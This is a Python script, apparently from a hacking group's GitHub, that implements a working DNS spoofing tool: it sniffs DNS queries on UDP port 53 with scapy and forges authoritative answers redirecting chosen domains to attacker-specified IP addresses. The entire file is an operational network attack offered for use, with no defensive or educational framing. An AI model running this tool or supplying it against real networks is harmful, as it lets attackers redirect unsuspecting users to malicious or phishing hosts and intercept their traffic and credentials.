import argparse
import os
import socket
from scapy.all import *
def info():
    print("""
Creator:Spider Anongreyhat
Team: TermuxHackz Society
Github: spider863644
Tool Name: DNS Spoofer
Version: 1.0
    """)
    
# Function to resolve domain name to IP address
def resolve_domain(domain):
    try:
        return socket.gethostbyname(domain)
    except socket.gaierror:
        print(f"[ERROR] Unable to resolve domain: {domain}")
        return None

# Function to handle DNS spoofing
def dns_spoof(packet, spoofed_domains):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        qname = packet[DNS].qd.qname.decode('utf-8').strip('.')
        if qname in spoofed_domains:
            # Create spoofed DNS response
            spoofed_ip = spoofed_domains[qname]
            dns_response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                           UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) / \
                           DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                               an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=spoofed_ip))
            send(dns_response, verbose=0)
            print(f"[INFO] Spoofed {qname} -> {spoofed_ip}")
        else:
            print(f"[INFO] Ignored {qname}")

# Main function
def main():
    os.system('clear')
    info()
    parser = argparse.ArgumentParser(description="DNS Spoofing Tool")
    parser.add_argument('-m', '--mappings', nargs='+', required=True, 
                        help="Domain-to-redirect mappings (format: domain1:target_domain_or_ip)")
    args = parser.parse_args()

    # Parse mappings and resolve domain names to IPs if needed
    spoofed_domains = {}
    for mapping in args.mappings:
        try:
            domain, target = mapping.split(':')
            target_ip = resolve_domain(target) if not target.replace('.', '').isdigit() else target
            if target_ip:
                spoofed_domains[domain] = target_ip
            else:
                print(f"[ERROR] Skipping {domain}: Unable to resolve {target}")
        except ValueError:
            print(f"[ERROR] Invalid mapping format: {mapping}")
            continue

    print("[INFO] Spoofing the following domains:")
    for domain, ip in spoofed_domains.items():
        print(f"  {domain} -> {ip}")

    # Start sniffing and spoofing
    sniff(filter="udp port 53", prn=lambda pkt: dns_spoof(pkt, spoofed_domains))

if __name__ == "__main__":
    main()